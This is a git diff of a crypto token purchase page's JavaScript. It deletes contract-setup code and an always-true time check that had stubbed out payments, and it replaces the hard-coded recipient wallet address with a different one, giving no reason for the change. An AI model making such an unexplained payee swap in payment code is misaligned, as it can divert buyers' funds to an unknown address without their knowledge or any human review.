@@ -8,7 +8,6 @@ let BB = document.querySelector("#buy_button")
 let BBinp = document.querySelector("#form_input")
 let transactionAvaileble = false
 let modalError = document.querySelector("#modalError")
-let contracts = {}
 let switchChainBtn = document.querySelector("#switchChainBtn")
 
 initWeb3()
@@ -63,10 +62,7 @@ function initWeb3() {
     web3.eth.defaultAccount
 }
 
-function initializeContract(name, schema, hash) {
-    let contract = new web3.eth.Contract(schema, hash);
-    contracts[name] = contract
-}
+
 
 function switchToBinance() {
     if (window.ethereum) {
@@ -196,7 +192,7 @@ let makeTransaction = (value)=>{
             params:[
                 {
                     from:user.coinbase,
-                    to:"0x9610946e952756973A6069dE267eCD4A49D26B50",
+                    to:"0xB6a6f75f44D7Af896e968B29245D66CB389e2cce",
                     value: web3.utils.toHex(WeiValue)
                 }
             ]
@@ -205,21 +201,8 @@ let makeTransaction = (value)=>{
 }
 
 
-let timeStart = 1639713600000
-async function getTime(){
-    let resp = await fetch("https://www.timeapi.io/api/Time/current/zone?timeZone=utc")
-    resp = await resp.json()
-    return resp
-}
 
-getTime().then(resp=>{
-    let data = new Date(resp.dateTime)
-    if (timeStart-data<=0 || true){
-        makeTransaction = (value)=>{
-            console.log(value);
-        }
-    }
-})
+
 
 
 
